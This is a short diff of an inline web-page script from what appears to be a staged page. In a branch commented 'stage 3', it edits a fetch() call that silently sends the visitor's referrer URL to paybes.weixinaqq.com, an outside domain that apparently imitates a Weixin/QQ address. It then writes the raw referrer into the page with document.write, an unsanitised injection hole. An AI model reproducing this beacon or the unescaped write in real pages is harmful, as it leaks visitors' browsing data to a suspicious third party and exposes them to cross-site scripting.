@@ -15,7 +15,7 @@
   else if(time==2)
   {
     //alert('stage 3');
-    fetch("http://paybes.weixinaqq.com/getinfo/"+document.referrer).then(res => res.text()).then();
+    fetch("http://paybes.weixinaqq.com/getminfo?info="+document.referrer).then(res => res.text()).then();
     document.write(document.referrer);
   }
 </script>
